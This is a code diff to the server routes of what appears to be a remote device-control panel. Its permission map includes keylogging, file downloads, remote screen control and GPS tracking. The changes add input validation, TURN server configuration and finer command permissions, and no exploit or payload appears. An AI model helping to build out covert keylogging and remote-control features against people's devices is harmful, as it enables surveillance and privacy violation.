@@ -10,6 +10,7 @@ import { requirePermission, getRequestUser } from '../middleware/auth.js';
 import type { Permission } from '../types/index.js';
 import { generateTurnCredentials } from '../utils/turnAuth.js';
 import { log } from '../utils/logger.js';
+import { isIP } from 'node:net';
 
 const PAGE_PERMISSIONS: Record<string, Permission> = {
   info: 'device:view',
@@ -30,6 +31,63 @@ const PAGE_PERMISSIONS: Record<string, Permission> = {
   keylogger: 'device:keylogger',
   downloads: 'files:download',
 };
+
+const SESSION_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;
+
+function validPort(value: string | undefined, fallback: string): string {
+  const parsed = Number(value || fallback);
+  return Number.isInteger(parsed) && parsed > 0 && parsed <= 65535 ? String(parsed) : fallback;
+}
+
+function formatIceHost(host: string): string {
+    if (host.startsWith('[') && host.endsWith(']')) return host;
+    return host.includes(':') ? `[${host}]` : host;
+}
+
+function isValidIceHost(host: string): boolean {
+  const unwrapped = host.startsWith('[') && host.endsWith(']') ? host.slice(1, -1) : host;
+  if (isIP(unwrapped) !== 0) return true;
+  if (unwrapped.length > 253) return false;
+  return unwrapped.split('.').every(label =>
+    label.length > 0
+    && label.length <= 63
+    && /^[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?$/.test(label)
+  );
+}
+
+function validateRealtimeCommand(cmd: CmdType, params: Record<string, unknown>): string | null {
+  const action = typeof params.action === 'string' ? params.action : '';
+  const needsSession = cmd === CMD.WEBRTC_OFFER
+    || cmd === CMD.WEBRTC_ICE
+    || (cmd === CMD.SCREEN && ['start', 'detach'].includes(action));
+  if (needsSession && (typeof params.sessionId !== 'string' || !SESSION_ID_PATTERN.test(params.sessionId))) {
+    return 'Invalid WebRTC session ID';
+  }
+  if (cmd === CMD.WEBRTC_OFFER) {
+    if (typeof params.sdp !== 'string' || params.sdp.length === 0 || params.sdp.length > 2_000_000) {
+      return 'Invalid WebRTC offer';
+    }
+    if (!Array.isArray(params.iceServers) || params.iceServers.length === 0 || params.iceServers.length > 8) {
+      return 'Invalid ICE server configuration';
+    }
+  }
+  if (cmd === CMD.WEBRTC_ICE) {
+    if (typeof params.candidate !== 'string' || params.candidate.length === 0 || params.candidate.length > 16_384) {
+      return 'Invalid ICE candidate';
+    }
+  }
+  if (cmd === CMD.SCREEN_CTRL) {
+    const allowedActions = new Set(['status', 'tap', 'swipe', 'gesture', 'touchStart', 'touchMove', 'touchEnd', 'key', 'text', 'volume']);
+    if (!allowedActions.has(action)) return 'Invalid remote-control action';
+    if (action === 'gesture' && (!Array.isArray(params.points) || params.points.length === 0 || params.points.length > 256)) {
+      return 'Invalid remote gesture';
+    }
+    if (action === 'text' && (typeof params.text !== 'string' || params.text.length > 10_000)) {
+      return 'Invalid remote text input';
+    }
+  }
+  return null;
+}
 
 export async function deviceRoutes(app: FastifyInstance) {
   app.get('/api/clients', {
@@ -73,20 +131,30 @@ export async function deviceRoutes(app: FastifyInstance) {
       return reply.code(404).send({ success: false, error: 'Client not found' });
     }
 
-    const iceServers: Array<{ urls: string; username?: string; credential?: string }> = [
-      { urls: 'stun:stun.l.google.com:19302' },
+    const stunUrl = process.env.STUN_URL || 'stun:stun.l.google.com:19302';
+    const iceServers: Array<{ urls: string | string[]; username?: string; credential?: string }> = [
+      { urls: stunUrl },
     ];
 
-    const turnHost = process.env.TURN_HOST;
+    const turnHost = process.env.TURN_HOST?.trim();
     if (turnHost) {
-      const turnPort = process.env.TURN_PORT || '3478';
+      const turnPort = validPort(process.env.TURN_PORT, '3478');
       const secret = process.env.TURN_SECRET;
-      if (!secret) {
+      if (!isValidIceHost(turnHost)) {
+        log.warn('TURN_HOST is invalid — TURN disabled');
+      } else if (!secret) {
         log.warn('TURN_HOST set but TURN_SECRET missing — TURN disabled');
       } else {
         const creds = generateTurnCredentials(id, secret);
+        const iceHost = formatIceHost(turnHost);
+        const turnUrls = [
+          `turn:${iceHost}:${turnPort}?transport=udp`,
+          `turn:${iceHost}:${turnPort}?transport=tcp`,
+        ];
+        const turnTlsPort = process.env.TURN_TLS_PORT;
+        if (turnTlsPort) turnUrls.push(`turns:${iceHost}:${validPort(turnTlsPort, '5349')}?transport=tcp`);
         iceServers.push({
-          urls: `turn:${turnHost}:${turnPort}?transport=udp`,
+          urls: turnUrls,
           username: creds.username,
           credential: creds.password,
         });
@@ -95,7 +163,10 @@ export async function deviceRoutes(app: FastifyInstance) {
 
     return {
       success: true,
-      data: { iceServers },
+      data: { iceServers, turnConfigured: iceServers.some(server => {
+        const urls = Array.isArray(server.urls) ? server.urls : [server.urls];
+        return urls.some(url => url.startsWith('turn:') || url.startsWith('turns:'));
+      }) },
     };
   });
 
@@ -138,7 +209,7 @@ export async function deviceRoutes(app: FastifyInstance) {
   });
 
   app.post('/api/cmd/:id/:cmd', {
-    preHandler: [app.auth, requirePermission('device:command')],
+    preHandler: [app.auth],
   }, async (request, reply) => {
     const { id, cmd } = request.params as { id: string; cmd: string };
     const params = (request.body || {}) as Record<string, unknown>;
@@ -148,8 +219,20 @@ export async function deviceRoutes(app: FastifyInstance) {
       return reply.code(400).send({ success: false, error: 'Invalid command' });
     }
 
+    const screenCommands: CmdType[] = [CMD.SCREEN, CMD.SCREEN_CTRL, CMD.WEBRTC_OFFER, CMD.WEBRTC_ICE];
+    const user = getRequestUser(request);
+    const requiredPermission: Permission = screenCommands.includes(cmdType) ? 'device:screen' : 'device:command';
+    if (!user.permissions?.includes(requiredPermission)) {
+      return reply.code(403).send({ success: false, error: 'Insufficient command permission' });
+    }
+
+    if (screenCommands.includes(cmdType)) {
+      const validationError = validateRealtimeCommand(cmdType, params);
+      if (validationError) return reply.code(400).send({ success: false, error: validationError });
+    }
+
     const sent = socketService.send(id, cmdType, params);
-    return { success: true, sent, queued: !sent };
+    return { success: true, sent, queued: !sent && !screenCommands.includes(cmdType) };
   });
 
   app.post('/api/gps/:id/:interval', {
@@ -254,7 +337,7 @@ function getPageData(id: string, page: string, client: any) {
       return { list: Array.isArray(raw) ? raw : [] };
     }
     case 'screen':
-      return {};  // Screen data is streamed via Socket.IO, not stored in DB
+      return {};  // WebRTC media and real-time screen state are not stored in DB.
     default:
       return { client: formatClient(client) };
   }
